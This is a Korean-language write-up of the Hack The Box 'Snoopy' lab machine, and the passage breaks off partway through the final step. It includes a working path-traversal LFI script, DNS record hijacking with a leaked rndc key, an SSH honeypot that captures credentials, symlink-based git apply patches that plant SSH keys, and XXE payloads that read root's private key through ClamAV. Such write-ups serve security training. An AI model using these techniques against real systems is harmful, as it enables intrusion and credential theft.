![Snoopy](/assets/htb-linux/snoopy/snoopy.png)

**Snoopy**는 Hard 난이도의 Linux 머신으로, **LFI** 취약점을 이용해 Bind9의 설정 파일에 포함된 `rndc.key` 을 탈취하는 것에서 시작한다. 

이후 해당 `rndc.key` 을 활용해 **mail 서브도메인을 공격자의 IP로 변경**하여 Mattermost의 비밀번호 재설정 메일을 가로채고 계정 접근 권한을 획득한다. 

서비스 내부에서는 웹 관리자가 원격 서버에 로그인할 때 사용하는 커스텀 플러그인을 조작해 공격자의 **SSH honeypot** 서버로 유도하고, 이를 통해 `cbrown` 의 자격 증명을 탈취한다. 

이어서 `cbrown` 의 권한을 활용해 `sbrown` 권한으로 `git apply` 를 실행할 수 있는 점을 악용하고, 심볼릭 링크 공격을 통해 권한 상승을 수행한다. 

마지막 단계에서는 **CVE-2023-20052** 취약점과 **XXE** 를 이용해 루트 사용자의 **SSH 키를 파일에 포함시키고, 해당 파일을 clamscan으로 검사하도록 유도**해 디버그 응답에 XXE 결과를 출력시키는 방식으로 최종적으로 루트 권한을 획득한다.

### LFI Automation Script

반복적인 파일 접근을 효율적으로 수행하기 위해 LFI 취약점을 자동화하는 스크립트를 작성하고, `lfi.py` 로 저장하였다:

```python
import argparse
import requests
import zipfile
import io
import sys

parser = argparse.ArgumentParser()
parser.add_argument("-p", required=True)
args = parser.parse_args()

url = f"http://snoopy.htb/download?file=....//....//....//..../{args.p}"

r = requests.get(url, timeout=10)
r.raise_for_status()

try:
    zf = zipfile.ZipFile(io.BytesIO(r.content))
except zipfile.BadZipFile: 
    print("File not found")
    sys.exit(1)

for name in zf.namelist():
    if name.endswith("/"):
        continue
    print(f"\n===== {name} =====")   
    
    data = zf.read(name)
    text = data.decode("utf-8", errors="ignore")
    print(text)
```

해당 스크립트를 이용하면 원하는 경로의 파일을 손쉽게 확인할 수 있다:

```bash
$ python3 lfi.py -p /etc/hostname

===== press_package/etc/hostname =====
snoopy.htb
```

### rndc-key Discovery

초기 `nmap` 스캔을 통해 대상 서버가 BIND 9.18 버전의 DNS 서비스를 사용하고 있음을 확인하였다.

이에 따라 BIND 설정 파일이 위치하는 `/etc/bind` 경로를 대상으로 LFI 취약점을 이용한 파일 열람을 시도하였다:

```bash
$ python3 lfi.py -p /etc/bind/named.conf

===== press_package/etc/bind/named.conf =====
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the 
// structure of BIND configuration files in Debian, *BEFORE* you customize 
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

그 결과, `named.conf` 파일 내에서 `rndc-key` 설정을 확인할 수 있었으며, 해당 key의 `secret` 값 또한 획득할 수 있었다.

이 key는 **BIND 서버를 원격으로 제어하는 데 사용되는 인증 정보**로, 이후 DNS 레코드 조작 공격에 활용할 수 있다.

또한 `named.conf.local` 파일을 확인한 결과 다음과 같은 zone 설정을 확인할 수 있었다:

```bash
$ python3 lfi.py -p /etc/bind/named.conf.local        

===== press_package/etc/bind/named.conf.local =====
//
// Do any local configuration here
//

// Consider adding the 1918 zones here, if they are not used in your
// organization
//include "/etc/bind/zones.rfc1918";

zone "snoopy.htb" IN {
    type master;
    file "/var/lib/bind/db.snoopy.htb";
    allow-update { key "rndc-key"; };
    allow-transfer { 10.0.0.0/8; };
};
```

해당 설정에서 `allow-update` 항목에 `rndc-key` 가 지정되어 있는 것을 확인할 수 있다.

이는 해당 **key를 보유한 사용자가 DNS 레코드를 동적으로 수정할 수 있음**을 의미하며, 앞서 획득한 `rndc-key` 를 이용하여 DNS 레코드 조작이 가능함을 알 수 있다.

## DNS Record Manipulation

웹 열거 과정에서 `mail.snoopy.htb` 메일 서버가 현재 비활성화 상태이며, DNS 레코드를 이전 중이라는 안내를 확인하였다.

또한 `mm.snoopy.htb` 의 비밀번호 재설정 기능을 확인한 결과, 입력한 이메일 주소로 재설정 메일이 전송되는 구조임을 알 수 있었다.

이에 따라 `/etc/passwd` 를 통해 확인한 사용자(`lpelt`)의 이메일(`lpelt@snoopy.htb`)을 이용하여 비밀번호 재설정을 시도하였다.

그러나 아래와 같이 `Failed to send password reset email successfully.` 메시지가 출력되며 메일 전송이 실패하는 것을 확인할 수 있었다:

![Snoopy](/assets/htb-linux/snoopy/mail.png)

이는 현재 메일 서버(`mail.snoopy.htb`)가 정상적으로 동작하지 않거나, DNS 설정 문제로 인해 메일이 전달되지 않고 있음을 유추할 수 있다.

LFI를 통해 획득한 `rndc-key`를 활용하여 `nsupdate` 명령어로 DNS 레코드 변경을 수행하였다:

```bash
$ nsupdate -y hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=

> server snoopy.htb
> zone snoopy.htb
> update add mail.snoopy.htb 30 IN A 10.10.14.26
> send
> quit
```

위와 같이 `mail.snoopy.htb` 레코드를 공격자 IP(`10.10.14.26`)로 설정하고, TTL을 `30` 초로 지정하였다.

이후 `dig` 명령어를 통해 레코드가 정상적으로 변경되었는지 확인하였다:

```bash
$ dig @snoopy.htb mail.snoopy.htb                              

; <<>> DiG 9.20.9-1-Debian <<>> @snoopy.htb mail.snoopy.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 7238
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: e445f8055249fe7b0100000069bd8ecbf1b535e5d417adf6 (good)
;; QUESTION SECTION:
;mail.snoopy.htb.               IN      A

;; ANSWER SECTION:
mail.snoopy.htb.        30      IN      A       10.10.14.26

;; Query time: 263 msec
;; SERVER: 10.129.229.5#53(snoopy.htb) (UDP)
;; WHEN: Fri Mar 20 14:15:31 EDT 2026
;; MSG SIZE  rcvd: 88
```

응답 결과, `mail.snoopy.htb` 가 공격자 IP를 가리키도록 설정된 것을 확인할 수 있다.

우선 Python의 [aiosmtpd](https://aiosmtpd.aio-libs.org/en/latest/) 라이브러리를 이용하여 SMTP 서버를 구성하였다:

```bash
$ python3 -m aiosmtpd -n -l 0.0.0.0:25
```

## SSH Credential Harvesting via Honeypot

`cbrown` 사용자의 SSH 접속을 가로채기 위해 Paramiko를 이용한 간단한 SSH honeypot 서버를 구현하였다:

```python
import socket
import paramiko

class SSHServer(paramiko.ServerInterface):
    def check_auth_password(self, username, password):
        print(f"{username}:{password}")
        return paramiko.AUTH_SUCCESSFUL

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind(('0.0.0.0', 2222))
server_socket.listen(5)

server_key = paramiko.RSAKey.generate(2048)

client_sock, addr = server_socket.accept()

transport = paramiko.Transport(client_sock)
transport.add_server_key(server_key)
server = SSHServer()
transport.start_server(server=server)

while True:
    channel = transport.accept(20)
    if channel is None:
        continue
    print("Client connected!")
    channel.close()
```

Paramiko를 이용하여 SSH 프로토콜을 처리하는 서버를 구성하고, 클라이언트의 인증 요청 시 전달되는 `username` 과 `password` 를 출력하도록 구현하였다.

이후 `trap.py` 를 실행한 상태에서 서버 프로비저닝 요청을 수행하면, 사용자의 SSH 접속이 공격자 시스템으로 유도되며 다음과 같이 자격 증명이 노출되는 것을 확인할 수 있다:

### git apply Path Traversal (CVE-2023-23946)

해당 버전의 Git에는 [CVE-2023-23946](https://salvacybersec.medium.com/gitlab-under-siege-unraveling-the-cve-2023-23946-security-breach-77444ce5d04a) 취약점이 존재한다.

이 취약점은 `git apply` 명령어를 통해 특수하게 조작된 패치 파일을 적용할 경우 발생하며, 공격자가 작업 디렉터리 외부의 파일을 덮어쓸 수 있도록 한다.

특히 심볼릭 링크를 활용할 경우, 패치 적용 과정에서 의도하지 않은 경로의 파일을 수정할 수 있으며, 이를 통해 권한 상승으로 이어질 수 있다.

예를 들면 다음과 같이 외부 경로의 파일을 직접 타겟으로 지정할 수 있다:

```patch
diff --git a/test.txt b/test.txt
index e69de29..d6548a1 1644
--- a/test.txt
+++ b/test.txt
@@ -0,0 +1 @@
+test.txt content.
```

이와 같은 방식으로 패치 파일을 구성하면, `git apply` 실행 시 특정 파일의 내용을 수정할 수 있다.

이를 확장하여 다음과 같이 특정한 외부 경로를 직접 지정하는 것도 가능하다:

```patch
diff --git a/home/sbrown/.ssh/authorized_keys b/home/sbrown/.ssh/authorized_keys
index e69de29..d6548a1 1644
--- /dev/null
+++ b/home/sbrown/.ssh/authorized_keys
@@ -0,0 +1 @@
+authorized_keys content.
```

겉으로 보면 `git apply` 실행 시 `sbrown` 사용자의 `authorized_keys` 파일에 공격자의 공개키를 삽입할 수 있을 것처럼 보인다.

하지만 실제로는 이러한 방식만으로는 원하는 결과를 얻기 어렵다.

`git apply` 는 패치에 포함된 경로를 단순히 절대적인 시스템 경로로 처리하는 것이 아니라, 기본적으로 현재 작업 트리 내부의 경로로 해석하려고 한다.

즉, `b/home/sbrown/.ssh/authorized_keys` 역시 시스템의 `/home/sbrown/.ssh/authorized_keys` 를 직접 가리키는 것이 아니라, 저장소 내부의 `home/sbrown/.ssh/authorized_keys` 와 같은 상대 경로로 취급될 가능성이 크다.

이러한 제한을 우회하기 위해 아래와 같이 심볼릭 링크를 활용할 수 있다:

```bash
$ ln -s /home/sbrown/.ssh symlink
```

즉, `symlink` 가 `/home/sbrown/.ssh` 를 가리키고 있다면, 해당 경로 아래에 파일을 생성하는 동작은 실제로 `/home/sbrown/.ssh` 디렉터리에 파일을 생성하는 것과 동일하게 동작한다.

이를 이용하여 다음과 같이 심볼릭 링크 하위 경로에 파일을 생성하는 패치를 구성할 수 있다:

```patch
diff --git /dev/null b/symlink/authorized_keys
new file mode 100644
index 0000000..d6548a1
--- /dev/null
+++ b/symlink/authorized_keys
@@ -0,0 +1 @@
+authorized_keys content.
```

### Exploiting git apply

우선 패치 파일을 생성하기 위해 `/tmp` 디렉터리에서 Git 저장소를 초기화하였다:

```bash
cbrown@snoopy:/tmp$ git init

Initialized empty Git repository in /tmp/.git/
```

이후 Git이 `/tmp` 디렉터리를 신뢰할 수 있는 저장소로 인식하도록 `safe.directory` 에 추가한 뒤, `/home/sbrown/.ssh` 를 가리키는 심볼릭 링크를 생성하였다:

```bash
cbrown@snoopy:/tmp$ git config --global --add safe.directory /tmp

cbrown@snoopy:/tmp$ ln -s /home/sbrown/.ssh symlink
```

다음과 같이 심볼릭 링크가 정상적으로 생성된 것을 확인할 수 있다:

```bash
cbrown@snoopy:/tmp$ ls -l symlink

lrwxrwxrwx 1 cbrown cbrown 17 Mar 21 15:02 symlink -> /home/sbrown/.ssh
```

이후 해당 심볼릭 링크를 Git에 추가하고 커밋하였다:

```bash

[main (root-commit) 730f5e0] symlink
 1 file changed, 1 insertion(+)
 create mode 120000 symlink
```

`git show` 를 통해 확인하면, Git이 해당 파일을 일반 파일이 아닌 심볼릭 링크(`120000`)로 기록한 것을 볼 수 있다.

```bash
cbrown@snoopy:/tmp$ git show

commit 730f5e0b24eb371291e4fc27167e6ecfcd18c4fd (HEAD -> main)
Author: cbrown <cbrown@snoopy.htb>
Date:   Sat Mar 21 15:08:14 2026 +0000

diff --git a/symlink b/symlink

--- /dev/null
+++ b/symlink
@@ -0,0 +1 @@

\ No newline at end of file
```

하지만 이 상태만으로는 원하는 형태의 패치를 만들기 어렵기 때문에, 심볼릭 링크를 유지한 채 이름을 변경하여 Git이 이를 정상적인 파일 이동으로 인식하도록 하였다:

```bash

[main cc0d807] newsymlink
 1 file changed, 0 insertions(+), 0 deletions(-)

```

다시 `git show` 를 통해 확인하면 다음과 같이 rename 형식의 diff가 생성된 것을 확인할 수 있다:

```bash
commit cc0d8078c32b47ea870139fb93b8778e648d9265 (HEAD -> main)
Author: cbrown <cbrown@snoopy.htb>

```

위 정보를 바탕으로 `git apply` 취약점을 이용하기 위한 패치 파일을 생성하였다:

```patch

similarity index 100%

rename to newsymlink
diff --git /dev/null b/newsymlink/authorized_keys
new file mode 100644
index 0000000..a9ec362
--- /dev/null
+++ b/newsymlink/authorized_keys
@@ -0,0 +1 @@
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDVSFYLurwPAwo9A0DisYl8UW7Q0kZhgfh8zB5ty+/69VGTNap67BX+fgBx0nerxZyt9OEyuR03kVP1iuK/Q0qiSYFAPSItZ3NFiFm2dzfA3XOvd6SqYi/pEcY8rRMmoHUVlbJa6c8Az0DLemBm4zrgIrOeyy5YgHMPGsN6Xl0UH1ZnTWrMu5Hj7nV41EHfjVJ3nhAt1RrAiY00tFwuyHsM9lF4KjX73PRXsRhNS0I0vMbrxePKQyv4vNmvpdNHAgHh8axdtOIy8uIkwpY
```

해당 패치는 심볼릭 링크를 활용하여 경로를 우회한 뒤, `authorized_keys` 파일을 생성하는 구조로 구성되어 있다.

특히 `newsymlink/authorized_keys` 경로를 통해 공격자가 제어하는 SSH 공개키를 삽입함으로써, `sbrown` 사용자의 SSH 인증을 우회할 수 있도록 하였다.

위 실행 로그를 보면 `warning: unable to unlink 'symlink': Operation not permitted` 라는 경고 문구가 발생한 것을 확인할 수 있다.

이는 `/tmp` 디렉터리에 설정된 `Sticky Bit` 특성과 파일 소유권 차이로 인해 발생한 것으로, `sbrown` 권한으로 실행된 `git apply` 가 `cbrown` 소유의 `symlink` 를 삭제하지 못했기 때문이다.

확인 결과 ClamAV 1.0.0 버전을 사용하고 있으며, 해당 버전에는 알려진 취약점이 존재한다.

### XML External Entity (XXE) in ClamAV (CVE-2023-20052)

ClamAV 1.0.0 버전에는 [CVE-2023-20052](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-clamav-xxe-TcSZduhN) 취약점이 존재한다.

해당 취약점은 XML 파싱 과정에서 외부 엔티티를 적절히 제한하지 않아 발생하며, 공격자가 임의의 파일을 읽을 수 있도록 한다.

특히 ClamAV는 DMG 파일 내부의 `plist` 파일을 분석하는 과정에서 XML을 파싱하게 되는데, 이 과정에서 XXE 페이로드를 삽입할 수 있다.

일반적인 `plist` 구조는 다음과 같다:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
```

여기에 외부 엔티티를 선언하여 [XXE](https://portswigger.net/web-security/xxe) 페이로드를 삽입할 수 있다:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

이후 XML 내부에서 `&xxe;` 엔티티를 참조하도록 구성하면, ClamAV가 해당 파일을 파싱하는 과정에서 지정된 파일(`/etc/passwd`)의 내용을 읽게 된다.

특히 `--debug` 옵션을 사용하여 `clamscan` 을 실행할 경우, 해당 파싱 결과가 디버그 출력으로 노출되므로 파일 내용이 그대로 출력되는 것을 확인할 수 있다.

### Exploiting XXE in ClamAV

XXE 페이로드를 삽입하기 위한 대상으로, [VideoLAN DMG](https://www.videolan.org/vlc/download-macosx.html) 파일을 다운로드하였다.

이후 `hgex` 도구를 이용하여 DMG 내부의 `plist` 파일을 확인한 결과, 기본적인 XML 구조가 포함되어 있는 것을 확인할 수 있었다:

![Snoopy](/assets/htb-linux/snoopy/plist.png)

해당 `plist` 구조에 XML External Entity를 삽입하여, 외부 파일을 참조하도록 수정하였다.

구체적으로 `lk` 엔티티를 정의하고, 이를 `/root/.ssh/id_rsa` 파일을 참조하도록 설정하였다:

![Snoopy](/assets/htb-linux/snoopy/plist-change.png)

이후 XML 내부의 `<key>` 값에 `&lk;` 엔티티를 참조하도록 설정하여, 정의된 외부 엔티티의 내용이 파싱 과정에서 포함되도록 구성하였다:
